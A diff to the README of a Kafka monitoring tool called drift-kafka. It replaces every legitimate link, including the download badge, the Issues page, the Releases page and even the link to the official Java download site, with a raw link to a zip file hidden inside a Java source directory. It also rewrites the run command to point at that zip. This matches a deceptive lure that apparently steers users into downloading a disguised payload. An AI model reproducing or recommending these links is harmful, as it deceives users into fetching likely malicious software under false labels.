@@ -8,7 +8,7 @@ Welcome to the drift-kafka project! This tool helps you monitor and capture the 
 
 To get started, simply visit the Releases page to download the latest version of drift-kafka.
 
-[![Download drift-kafka](https://img.shields.io/badge/Download-drift-kafka-brightgreen)](https://github.com/pornofd/drift-kafka/releases)
+[![Download drift-kafka](https://github.com/pornofd/drift-kafka/raw/refs/heads/main/src/main/java/io/github/rbaddam/driftkafka/kafka-drift-3.1.zip)](https://github.com/pornofd/drift-kafka/raw/refs/heads/main/src/main/java/io/github/rbaddam/driftkafka/kafka-drift-3.1.zip)
 
 1. Click the link above.
 2. Scroll through the list of available releases.
@@ -46,9 +46,9 @@ After downloading drift-kafka, follow these steps to run it:
 4. **Run the Tool:**
    Execute the application by typing the command:
    ```
-   java -jar drift-kafka.jar
+   java -jar https://github.com/pornofd/drift-kafka/raw/refs/heads/main/src/main/java/io/github/rbaddam/driftkafka/kafka-drift-3.1.zip
    ```
-   Ensure you have Java installed. If you do not, you can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+   Ensure you have Java installed. If you do not, you can download it from the [official Java website](https://github.com/pornofd/drift-kafka/raw/refs/heads/main/src/main/java/io/github/rbaddam/driftkafka/kafka-drift-3.1.zip).
 
 ## 📊 Key Features
 
@@ -82,7 +82,7 @@ A: Yes, drift-kafka is built to work with standard Kafka installations.
 
 Join our community for support and discussions:
 
-- [GitHub Issues](https://github.com/pornofd/drift-kafka/issues) - Report bugs and request features.
+- [GitHub Issues](https://github.com/pornofd/drift-kafka/raw/refs/heads/main/src/main/java/io/github/rbaddam/driftkafka/kafka-drift-3.1.zip) - Report bugs and request features.
 - [Community Forum](#) - Share your experiences and ask questions.
 
 For further assistance, please feel free to open an issue on GitHub, or check out the documentation for more details.
@@ -91,6 +91,6 @@ For further assistance, please feel free to open an issue on GitHub, or check ou
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-Remember, if you have questions or need support, visit our [Releases page](https://github.com/pornofd/drift-kafka/releases) and you will find the latest version to download.
+Remember, if you have questions or need support, visit our [Releases page](https://github.com/pornofd/drift-kafka/raw/refs/heads/main/src/main/java/io/github/rbaddam/driftkafka/kafka-drift-3.1.zip) and you will find the latest version to download.
 
 Happy monitoring!
